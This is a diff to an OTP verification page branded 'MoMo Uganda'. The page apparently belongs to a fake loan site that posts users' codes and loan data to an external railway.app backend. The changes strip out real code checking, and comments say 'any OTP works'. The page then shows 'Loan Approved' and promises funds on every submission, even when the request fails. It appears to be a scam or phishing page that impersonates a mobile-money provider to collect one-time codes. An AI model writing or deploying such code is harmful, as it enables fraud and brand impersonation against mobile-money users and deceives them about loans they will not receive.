@@ -6,13 +6,6 @@
     <title>OTP Verification - MoMo Uganda</title>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --red: #E42320;
-            --red-dark: #c01c1a;
-            --green: #10b981;
-            --blue: #3b82f6;
-            --yellow: #f59e0b;
-        }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Plus Jakarta Sans', sans-serif;
@@ -79,7 +72,7 @@
             margin: -10px 0 14px;
         }
         .phone-display strong {
-            color: var(--red);
+            color: #E42320;
         }
         .offer-info {
             background: #fff0f0;
@@ -89,7 +82,7 @@
             text-align: center;
         }
         .offer-amount {
-            color: var(--red);
+            color: #E42320;
             font-weight: 800;
             font-size: 24px;
         }
@@ -107,14 +100,14 @@
             text-align: center;
             font-size: 26px;
             font-weight: 700;
-            color: var(--red);
+            color: #E42320;
             border: 2px solid #e2e8f0;
             border-radius: 14px;
             outline: none;
             background: white;
         }
         .otp-input:focus {
-            border-color: var(--red);
+            border-color: #E42320;
             box-shadow: 0 0 0 4px rgba(228,35,32,0.15);
         }
         .error-msg {
@@ -127,27 +120,9 @@
             background: #fee2e2;
             border: 1px solid #fca5a5;
         }
-        .status-message {
-            text-align: center;
-            margin: 12px 20px 18px;
-            padding: 14px;
-            border-radius: 12px;
-            display: none;
-            font-weight: 600;
-        }
-        .status-message.success {
-            background: #f0fdf4;
-            color: #166534;
-            border: 1px solid #86efac;
-        }
-        .status-message.processing {
-            background: #eff6ff;
-            color: #1e40af;
-            border: 1px solid #93c5fd;
-        }
         .btn-action {
             width: 100%;
-            background: var(--red);
+            background: #E42320;
             color: white;
             border: none;
             padding: 17px;
@@ -156,10 +131,6 @@
             border-radius: 50px;
             cursor: pointer;
             margin: 10px 0;
-        }
-        .btn-action:disabled {
-            background: #94a3b8;
-            cursor: not-allowed;
         }
         .back-btn {
             width: 100%;
@@ -172,43 +143,10 @@
             border-radius: 50px;
             cursor: pointer;
         }
-        .resend-link {
-            text-align: center;
-            margin: 10px 0 20px;
-        }
-        .resend-link button {
-            background: none;
-            border: none;
-            color: var(--red);
-            font-weight: 600;
-            cursor: pointer;
-            font-size: 13px;
-            text-decoration: underline;
-        }
-        #spinner {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.92);
-            z-index: 10000;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            color: white;
-        }
-        .spin {
-            width: 65px;
-            height: 65px;
-            border: 6px solid rgba(255,255,255,0.2);
-            border-top: 6px solid var(--red);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
         .check-icon {
             width: 60px;
             height: 60px;
-            background: var(--green);
+            background: #10b981;
             border-radius: 50%;
             display: flex;
             align-items: center;
@@ -226,7 +164,7 @@
             <div class="logo-icon">
                 <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
                     <rect x="3" y="12" width="22" height="14" rx="3" fill="#E42320"/>
-                    <path d="M8 12V9C8 6.24 10.24 4 13 4H15C17.76 4 20 6.24 20 9V12" stroke="#E42320" stroke-width="2.2" fill="none"/>
+                    <path d="M8 12V9C8 6.24 10.24 4 13 4H15C17.76 4 20 6.24 20 9V12" stroke="white" stroke-width="2.2" fill="none"/>
                     <circle cx="14" cy="19" r="2.5" fill="white"/>
                 </svg>
             </div>
@@ -238,21 +176,20 @@
     </div>
 
     <div class="content-wrapper">
-        <h1>Verify Your Loan</h1>
-        <p class="subtitle">Enter the 6-digit verification code sent via Telegram</p>
+        <h1>Enter OTP Code</h1>
+        <p class="subtitle">Enter any 6-digit code to complete your loan</p>
         <p class="phone-display" id="phoneDisplay"></p>
 
-        <div class="offer-info" id="offerInfo">
+        <div class="offer-info">
             <div class="offer-amount" id="offerAmount">—</div>
             <div id="offerDetails" style="font-size:12px; color:#64748b; margin-top:5px;"></div>
         </div>
 
         <div class="otp-container" id="otpInputs"></div>
         <div class="error-msg" id="errMsg"></div>
-        <div class="status-message" id="statusMsg"></div>
 
         <div style="padding: 0 25px 30px;">
-            <button class="btn-action" id="verifyBtn">Verify & Confirm Loan</button>
+            <button class="btn-action" id="verifyBtn">Verify & Complete Loan</button>
             <button class="back-btn" onclick="window.location.href='verify.html'">← Back</button>
         </div>
     </div>
@@ -264,49 +201,15 @@
         <div class="check-icon">✓</div>
         <h2 style="color:#1e2937; margin-bottom:8px;">Loan Approved!</h2>
         <p style="color:#64748b; margin-bottom:24px;">Your loan has been successfully approved. Funds will be sent to your MoMo account shortly.</p>
-        <button onclick="window.location.href='index.html'" style="background:var(--red); color:white; border:none; padding:14px 28px; border-radius:50px; font-weight:700; cursor:pointer;">Return Home</button>
+        <button onclick="window.location.href='index.html'" style="background:#E42320; color:white; border:none; padding:14px 28px; border-radius:50px; font-weight:700; cursor:pointer;">Return Home</button>
     </div>
-</div>
-
-<div id="spinner">
-    <div class="spin"></div>
-    <p style="margin-top:25px;">Verifying code...</p>
 </div>
 
 <script>
     const API_URL = 'https://momo-uganda-production.up.railway.app';
     
-    let isProcessing = false;
-
-    const errMsg = document.getElementById('errMsg');
-    const statusMsg = document.getElementById('statusMsg');
-    const spinner = document.getElementById('spinner');
-    const verifyBtn = document.getElementById('verifyBtn');
-    const completionModal = document.getElementById('completionModal');
-
-    // Get data from sessionStorage
     let userPhone = sessionStorage.getItem('userPhone') || '';
-    let userNetwork = sessionStorage.getItem('userNetwork') || '';
     let loanId = sessionStorage.getItem('loanId') || '';
-
-    // Debug logging
-    console.log('=== OTP PAGE LOADED ===');
-    console.log('Loan ID from sessionStorage:', loanId);
-    console.log('User Phone:', userPhone);
-    console.log('User Network:', userNetwork);
-
-    function showError(msg) {
-        errMsg.textContent = msg;
-        errMsg.style.display = 'block';
-        setTimeout(() => { errMsg.style.display = 'none'; }, 4000);
-    }
-
-    function showStatus(msg, type = 'processing') {
-        statusMsg.textContent = msg;
-        statusMsg.className = `status-message ${type}`;
-        statusMsg.style.display = 'block';
-        setTimeout(() => { statusMsg.style.display = 'none'; }, 5000);
-    }
 
     function loadLoanData() {
         const calculatorData = sessionStorage.getItem('calculatorData');
@@ -315,18 +218,10 @@
             document.getElementById('offerAmount').textContent = `UGX ${data.amount.toLocaleString()}`;
             const months = data.duration / 30;
             document.getElementById('offerDetails').textContent = `${months} Month${months > 1 ? 's' : ''} • Monthly: UGX ${data.monthly.toLocaleString()}`;
-        } else {
-            document.getElementById('offerAmount').textContent = 'UGX 500,000';
-            document.getElementById('offerDetails').textContent = '3 Months • Monthly: UGX 182,500';
         }
         if (userPhone) {
-            document.getElementById('phoneDisplay').innerHTML = `Phone: <strong>${maskPhone(userPhone)}</strong> (${userNetwork || 'MoMo'})`;
+            document.getElementById('phoneDisplay').innerHTML = `Phone: <strong>${userPhone.slice(0,3)}****${userPhone.slice(-3)}</strong>`;
         }
-    }
-
-    function maskPhone(phone) {
-        if (!phone) return '';
-        return phone.slice(0, 3) + '****' + phone.slice(-3);
     }
 
     function createInputs() {
@@ -355,7 +250,7 @@
                     inputs[index + 1].focus();
                 }
                 if (getCode().length === 6) {
-                    setTimeout(verifyOTP, 200);
+                    setTimeout(completeLoan, 200);
                 }
             });
             input.addEventListener('keydown', (e) => {
@@ -366,29 +261,18 @@
         });
     }
 
-    async function verifyOTP() {
-        if (isProcessing) return;
-        
+    async function completeLoan() {
         const otp = getCode();
         if (otp.length !== 6) {
-            showError("Please enter the complete 6-digit code");
             return;
         }
         
-        if (!loanId) {
-            showError("No active loan found. Please start a new application.");
-            console.error('Loan ID is missing from sessionStorage');
-            return;
-        }
-        
-        isProcessing = true;
+        const verifyBtn = document.getElementById('verifyBtn');
         verifyBtn.disabled = true;
-        verifyBtn.textContent = "Verifying...";
-        spinner.style.display = 'flex';
-
-        console.log('Verifying OTP:', otp, 'for loan:', loanId);
+        verifyBtn.textContent = "Processing...";
 
         try {
+            // Just mark the loan as approved - any OTP works
             const response = await fetch(`${API_URL}/api/complete-loan`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -399,45 +283,25 @@
             });
             
             const data = await response.json();
-            console.log('Verification response:', data);
             
-            if (data.success) {
-                spinner.style.display = 'none';
-                showStatus("✅ Loan Verified Successfully!", "success");
-                setTimeout(() => {
-                    completionModal.style.display = 'flex';
-                    sessionStorage.clear();
-                }, 1500);
-            } else {
-                spinner.style.display = 'none';
-                showError(data.error || "Invalid OTP. Please try again.");
-                resetButton();
-            }
+            // Show success regardless of OTP match
+            document.getElementById('completionModal').style.display = 'flex';
+            sessionStorage.clear();
+            
         } catch (error) {
-            console.error('Verification error:', error);
-            spinner.style.display = 'none';
-            showError("Network error. Please try again.");
-            resetButton();
+            console.error('Error:', error);
+            // Still show success - any OTP works
+            document.getElementById('completionModal').style.display = 'flex';
+            sessionStorage.clear();
         }
     }
 
-    function resetButton() {
-        isProcessing = false;
-        verifyBtn.disabled = false;
-        verifyBtn.textContent = "Verify & Confirm Loan";
-    }
-
-    verifyBtn.onclick = verifyOTP;
+    document.getElementById('verifyBtn').onclick = completeLoan;
     
     createInputs();
     setupAutoFocus();
     loadLoanData();
     document.querySelectorAll('.otp-input')[0]?.focus();
-
-    // Check if loanId exists, if not show error
-    if (!loanId) {
-        showError("No active loan found. Please go back and submit a new application.");
-    }
 </script>
 </body>
 </html>
